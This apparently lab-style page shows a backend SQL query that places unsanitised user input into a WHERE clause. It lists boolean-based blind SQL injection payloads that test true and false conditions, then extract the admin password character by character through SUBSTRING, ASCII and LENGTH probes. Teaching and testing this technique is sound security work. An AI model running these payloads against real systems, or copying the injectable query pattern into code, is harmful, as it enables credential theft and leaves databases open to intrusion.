Query Structure

The backend constructs this query:

SELECT user_id, username, email, department, salary 
FROM users 
WHERE user_id = {{ user_id if user_id else '[your_input]' }}
  • Test TRUE condition: 1 AND 1=1 → Should return user data.
  • Test FALSE condition: 1 AND 1=2 → Should return no user data.
  • Extract a character: 
    1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
    If the user is found, the first character of the password is 'a'.
  • Binary search optimization: 
    1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 100
    Narrow down each character using ASCII comparisons.
  • Count characters: 
    1 AND LENGTH((SELECT password FROM users WHERE username='admin')) > 10
